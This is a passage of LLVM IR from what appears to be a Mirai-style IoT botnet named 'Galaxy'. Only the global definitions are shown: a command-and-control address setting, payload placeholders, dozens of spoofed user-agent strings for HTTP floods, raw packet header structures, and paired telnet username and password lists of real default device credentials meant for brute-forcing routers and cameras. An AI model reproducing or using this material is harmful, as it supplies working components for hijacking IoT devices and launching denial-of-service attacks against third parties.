; ModuleID = 'host/ir_bcf/Galaxy.g.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [14 x i8] c"127.0.0.1:760\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [18 x i8] c"Payload w Busybox\00", align 1
@Payload = global i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [25 x i8] c"\C2\B4Payload Witout Busybox\00", align 1
@Telnet_Usernames = global [35 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.66 = private unnamed_addr constant [15 x i8] c"default\00admin\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.68 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@Telnet_Passwords = global [35 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)], align 16
@.str.70 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.72 = private unnamed_addr constant [12 x i8] c"adminadmin\00\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"OxhlwSG8\00true\00\00", align 1
@.str.74 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.76 = private unnamed_addr constant [15 x i8] c"LSiuY7pOmZG2s\00\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"Uq-4GIt3M\00\00", align 1
@.str.78 = private unnamed_addr constant [8 x i8] c"GM8182\00\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"cms500\00\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.81 = private unnamed_addr constant [9 x i8] c"3ep5w2u\00\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"Serv4EMC0\00\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ROOT500\00\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"tlJwpbo6\00\00", align 1
@.str.85 = private unnamed_addr constant [10 x i8] c"ahetzip8\00\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"inflection\00\00", align 1
@.str.87 = private unnamed_addr constant [10 x i8] c"kont2004\00\00", align 1
@.str.88 = private unnamed_addr constant [16 x i8] c"t0talc0ntr0l4!\00\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.90 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@Mirai_Usernames = global [34 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
